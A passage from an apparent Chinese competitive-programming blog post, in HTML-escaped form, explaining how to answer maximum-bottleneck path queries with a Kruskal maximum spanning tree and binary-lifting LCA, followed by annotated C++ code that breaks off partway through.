&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;对于任意两点u&amp;amp;v，我们需要找出能使得w最大的一条最优路径。&lt;br&gt;因此需要生成一个新图，使得原图中联通&lt;strong&gt;任意两点之间只存在一条&lt;/strong&gt;能使得w最大的最优路径。&lt;br&gt;因此这是一棵树……&lt;br&gt;又因为要使w最大，应尽量选择边权大的边作为路径……  然后就突然发觉：这不就是Kruskal算法的过程吗？只不过最小生成树优先选择边权小的边，此时优先选择边权大的。&lt;br&gt;因此要求的新图就是一颗&lt;strong&gt;最大生成树&lt;/strong&gt;……Kruskal可破。&lt;br&gt;然后就是求任意两点LCA了。此处使用倍增，也方便维护某节点向树根爬的时候路上的最小权值。&lt;br&gt;（用树链剖分+线段树维护也行…………）&lt;br&gt;更具体的看代码注释。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; inf 1000000005&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Node&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; u,v,w;&lt;span class=&#34;comment&#34;&gt;//两点u&amp;amp;v以及边权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;operator&lt;/span&gt; &amp;lt; (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; Node &amp;amp;b) &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; w&amp;lt;b.w;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vector &amp;lt;Node&amp;gt; e[&lt;span class=&#34;number&#34;&gt;50005&lt;/span&gt;];&lt;span class=&#34;comment&#34;&gt;//e[u]储存节点u相连的边集。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;priority_queue &amp;lt;Node&amp;gt; Q;&lt;span class=&#34;comment&#34;&gt;//边权越大的优先级越高&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fa[&lt;span class=&#34;number&#34;&gt;50005&lt;/span&gt;];&lt;span class=&#34;comment&#34;&gt;//Kruskal的御用并查集，fa[u]代表u点所处集合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; vis[&lt;span class=&#34;number&#34;&gt;50005&lt;/span&gt;];&lt;span class=&#34;comment&#34;&gt;//是否已经被dfs过程访问过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fas[&lt;span class=&#34;number&#34;&gt;50005&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;],minw[&lt;span class=&#34;number&#34;&gt;50005&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;],deep[&lt;span class=&#34;number&#34;&gt;50005&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//fas[u][j]代表u点在所处树中的第2^j级父亲编号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//minw[u][j]代表u点在所处树中至第2^j级父亲的路径上最小边权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//deep[u]代表u点在所处树中深度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//查找x所在集合编号&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (x==fa[x]) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; fa[x]=&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(fa[x]);&lt;span class=&#34;comment&#34;&gt;//路径压缩&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;uni&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//合并a,b所在集合&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fa[&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(a)]=&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; u,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; w)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//添加新图边&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Node one;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    one.u=u;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    one.v=v;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    one.w=w;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    e[u].&lt;span class=&#34;built_in&#34;&gt;push_back&lt;/span&gt;(one);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;uni&lt;/span&gt;(u,v);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;dfs&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; u,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//dfs，u代表当前点，f为当前点父亲，k为深度&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vis[u]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    deep[u]=k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;i&amp;lt;e[u].&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;();i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (e[u][i].v==f) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;dfs&lt;/span&gt;(e[u][i].v,u,k+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fas[e[u][i].v][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=u;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            minw[e[u][i].v][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=e[u][i].w;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n,m,q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Kruskal&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; linked=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(!Q.&lt;span class=&#34;built_in&#34;&gt;empty&lt;/span&gt;()&amp;amp;&amp;amp;linked&amp;lt;n&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;) &amp;#123;&lt;span class=&#34;comment&#34;&gt;//边数m可能少于n-1，因此需要注意Q是否为空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Node now=Q.&lt;span class=&#34;built_in&#34;&gt;top&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Q.&lt;span class=&#34;built_in&#34;&gt;pop&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a=now.u,b=now.v;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(a)==&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(b)) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            linked++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;add&lt;/span&gt;(a,b,now.w);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;add&lt;/span&gt;(b,a,now.w);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;lca&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//求x，y的lca&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(x)!=&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(y)) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//不在一个树里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans=inf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (deep[y] &amp;gt;deep[x]) &lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x,y);&lt;span class=&#34;comment&#34;&gt;//较深的标记为x&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;;i&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;i--)&lt;span class=&#34;comment&#34;&gt;//令x跳到与y相同高度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(deep[fas[x][i]]&amp;gt;=deep[y])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(ans,minw[x][i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x=fas[x][i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (x==y) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;; i&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i--)&lt;span class=&#34;comment&#34;&gt;//让x,y一起跳到lca节点下方&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(fas[x][i]!=fas[y][i])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(ans,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(minw[x][i],minw[y][i]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x=fas[x][i]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            y=fas[y][i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ans=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(ans,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(minw[x][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],minw[y][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]));&lt;span class=&#34;comment&#34;&gt;//统计最小边权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span 